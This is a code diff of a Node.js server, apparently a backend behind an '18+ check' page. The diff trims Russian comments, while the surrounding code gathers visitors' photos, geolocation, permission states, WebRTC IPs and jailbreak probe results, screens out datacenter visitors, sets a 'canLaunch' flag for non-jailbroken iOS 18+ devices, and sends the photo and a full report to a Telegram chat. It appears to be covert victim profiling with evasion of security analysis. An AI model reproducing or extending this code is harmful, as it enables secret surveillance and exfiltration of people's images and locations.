@@ -149,7 +149,6 @@ function isIgnoredScheme(s = '') {
 }
 
 // ===== iPad desktop-mode detection (патч) =====
-// Условие iPadOS с desktop UA: platform = Mac|MacIntel И (тач>1 ИЛИ явные флаги/UA)
 function isIpadDesktop({ platform, userAgent, cp }) {
   const plat = String(platform || '');
   const ua   = String(userAgent || '');
@@ -179,13 +178,11 @@ function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {} }) {
   const v = pickIosVersion(iosVersion, cp);
   const iosOk = v != null && v >= 18;
 
-  // Платформа ок: iPhone/iPad/… или iPad в десктоп-режиме
   const plat = String(platform || '');
   const classicOk = /iPhone|iPad/i.test(plat);
   const ipadDesktopOk = isIpadDesktop({ platform: plat, userAgent, cp });
   const platformOk = classicOk || ipadDesktopOk;
 
-  // --- JB пересчёт по факту результатов
   const jb            = cp?.jbProbesActive || {};
   const jbRowsRaw     = Array.isArray(jb.results) ? jb.results : [];
   const jbRows        = jbRowsRaw.filter(r => !isIgnoredScheme(r?.scheme));
@@ -196,17 +193,14 @@ function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {} }) {
   const jbOk          = !anyOpened && labelsClean.has(labelRaw);
   const jbLabel       = jbOk ? (labelRaw || 'negative') : (labelRaw || 'positive');
 
-  // --- DC / ISP
   const dcWords = Array.isArray(cp?.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
   const dcOk    = !dcWords;
 
-  // --- Permissions
   const perms  = cp?.permissions || {};
   const geoOk  = perms.geolocation === 'granted' || perms.geolocation === true;
   const camOk  = perms.camera === 'granted' || perms.camera === true;
   const micOk  = perms.microphone === 'granted' || perms.microphone === true;
 
-  // Требования допуска:
   const canLaunch = iosOk && platformOk && jbOk;
 
   return {
@@ -218,13 +212,12 @@ function deriveStatus({ iosVersion, platform, userAgent, cp = {}, dc = {} }) {
   };
 }
 
-// [HTML] — единый отчёт (чеклист + сводка + JB-таблица + сырой JSON)
+// [HTML] — отчёт (чеклист + сводка + JB-таблица + сырой JSON)
 function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc }) {
   const s   = deriveStatus({ iosVersion, platform, userAgent, cp, dc });
   const jb  = cp?.jbProbesActive || {};
   const jbSum  = jb.summary || {};
 
-  // берём уже отфильтрованные строки из deriveStatus
   const jbRows = Array.isArray(s?._jb?.rows)
     ? s._jb.rows
     : (Array.isArray(jb.results) ? jb.results.filter(r => !isIgnoredScheme(r?.scheme)) : []);
@@ -412,8 +405,7 @@ app.post('/api/report', async (req, res) => {
       userAgent, platform, iosVersion, isSafari,
       geo, photoBase64, note, code,
 
-      // с фронта:
-      client_profile,   // мультисбор (включая jbProbesActive, permissions, webrtcIps, ...)
+      client_profile,   // включает jbProbesActive, permissions, webrtcIps, ...
       device_check      // { score, label, reasons[], details{...} }
     } = req.body || {};
 
@@ -428,7 +420,6 @@ app.post('/api/report', async (req, res) => {
     const dc = device_check   || {};
     const s  = deriveStatus({ iosVersion, platform, userAgent, cp, dc });
 
-    // ---- CAPTION (с чеклистом и "Можно запускать")
     const captionLines = [
       '<b>Новый отчёт 18+ проверка</b>',
       `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
@@ -443,7 +434,6 @@ app.post('/api/report', async (req, res) => {
     ].filter(Boolean);
     const caption = captionLines.join('\n');
 
-    // 1) Фото + капшин
     const buf = b64ToBuffer(photoBase64);
     const tgPhoto = await sendPhotoToTelegram({
       chatId: String(row.chat_id),
@@ -451,7 +441,6 @@ app.post('/api/report', async (req, res) => {
       photoBuf: buf
     });
 
-    // 2) Один HTML-файл с полной инфой
     const html = buildHtmlReport({
       code, geo, userAgent, platform, iosVersion, isSafari,
       cp, dc
